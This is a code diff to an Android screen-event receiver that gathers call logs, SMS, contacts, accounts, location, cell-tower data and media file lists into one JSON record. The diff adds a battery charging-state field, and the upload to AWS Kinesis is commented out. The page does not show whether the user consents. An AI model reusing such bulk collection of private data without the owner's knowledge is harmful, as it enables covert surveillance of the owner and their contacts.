@@ -78,15 +78,15 @@ public class ScreenReceiver extends BroadcastReceiver {
             JSONArray jsonObjectInstall = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"Install");
             JSONArray jsonObjectUninstall = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"UnInstall");
             JSONArray jsonObjectUsage = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"AppUsage");
-            JSONObject jsonObjectSensor = DatabaseInitializer.fetchJsonData(AppDatabase.getAppDatabase(ctx),"Sensor");
+            JSONArray jsonObjectSensor = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"Sensor");
             JSONArray jsonObjBTState = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"Bluetooth_State");
             JSONArray jsonObjBTConn = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"Bluetooth_Connection");
             JSONObject jsonObjectWifi = DatabaseInitializer.fetchJsonData(AppDatabase.getAppDatabase(ctx),"WifiConnection");
             JSONArray jsonObjectAirplane = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"Airplane");
-            JSONObject jsonObjCellTower = DatabaseInitializer.fetchJsonData(AppDatabase.getAppDatabase(ctx),"CellTower");
+            JSONArray jsonObjCellTower = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"CellTower");
             JSONArray jsonObjLocation = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"Location");
+            JSONArray jsonObjBatteryPlug = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"BatteryPlug");
             JSONArray jsonObjAccounts = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"Accounts");
-            //JSONObject jsonObjLocation = DatabaseInitializer.fetchJsonData(AppDatabase.getAppDatabase(ctx),"Location");
             JSONArray jsonObjAudio = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"AudioFiles");
             JSONArray jsonObjVideo = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"VideoFiles");
             JSONArray jsonObjImage = DatabaseInitializer.fetchJsonArray(AppDatabase.getAppDatabase(ctx),"ImageFiles");
@@ -109,6 +109,7 @@ public class ScreenReceiver extends BroadcastReceiver {
             object.put("Airplane_Mode",jsonObjectAirplane);
             object.put("CellTower",jsonObjCellTower);
             object.put("Location",jsonObjLocation);
+            object.put("Battery_Charging_State",jsonObjBatteryPlug);
             object.put("Accounts",jsonObjAccounts);
             object.put("Audio_Files",jsonObjAudio);
             object.put("Video_Files",jsonObjVideo);
@@ -116,7 +117,6 @@ public class ScreenReceiver extends BroadcastReceiver {
             object.put("Call_Logs",jsonObjCall);
             object.put("SMS",jsonObjSms);
             object.put("Contacts",jsonObjContact);
-            //object.put("Location",jsonObjLocation);
             object.put("Battery",jsonObjBattery);
             object.put("RAM Storage",jsonObjRAM);
             object.put("Internal Storage",jsonObjInternal);
@@ -127,7 +127,7 @@ public class ScreenReceiver extends BroadcastReceiver {
 
             JSONObject finalObject = DatabaseInitializer.fetchJsonData(AppDatabase.getAppDatabase(ctx),"FINAL_JSON");
 
-           // AwsUploader uploader = new AwsUploader(ctx);
+            //AwsUploader uploader = new AwsUploader(ctx);
             //uploader.submitKinesisRecord(finalObject);
 
             Log.i("FINAL JSON..",finalObject.toString());
